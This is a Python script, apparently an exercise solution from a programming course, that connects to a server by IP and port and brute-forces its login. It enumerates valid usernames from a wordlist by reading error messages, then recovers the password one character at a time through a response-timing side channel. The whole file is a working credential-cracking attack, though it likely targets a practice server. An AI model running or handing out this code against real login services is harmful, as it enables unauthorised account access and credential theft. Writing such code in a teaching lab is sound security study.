# write your code here
import argparse
import itertools
import socket
import json
import string
import time

parser = argparse.ArgumentParser()
parser.add_argument("ip_address")
parser.add_argument("port", type=int)

args = parser.parse_args()
ip_address = args.ip_address
port = args.port


def brute_force(soc):
    correct_login = find_login(soc)
    if len(correct_login) == 0:
        raise ConnectionRefusedError()
    correct_pwd = find_pwd(soc, correct_login, "")
    if len(correct_pwd) == 0:
        raise ConnectionRefusedError()
    return {"login": correct_login, "password": correct_pwd}


def find_login(soc):
    with open("logins.txt", "r") as file:
        for line in file:
            lgn_line = line.strip()
            soc.send(login_request(lgn_line, "?").encode())
            response = server_result(soc.recv(1024).decode())
            if response == "Wrong password!":
                return lgn_line
            elif response == "Exception happened during login":
                return lgn_line
    return ""


def find_pwd(soc, correct_login, pwd_part):
    chars = string.ascii_letters + string.digits + string.punctuation
    for char in chars:
        pwd = pwd_part + char
        soc.send(login_request(correct_login, pwd).encode())
        start = time.perf_counter()
        response = server_result(soc.recv(1024).decode())
        end = time.perf_counter()
        if response == "Connection success!":
            return pwd
        elif end - start > 0.1:
            return find_pwd(soc, correct_login, pwd)
    return ""


def pwd_variations(pwd_template):
    combinations = list(itertools.product(*((c.lower(), c.upper()) for c in pwd_template)))
    return [''.join(c) for c in combinations]


def login_request(usr, pwd):
    return json.dumps({"login": usr, "password": pwd})


def server_result(json_response):
    return json.loads(json_response)["result"]


def connect():
    with socket.socket() as soc:
        soc.connect((ip_address, port))
        credentials = brute_force(soc)
        print(json.dumps(credentials))


connect()
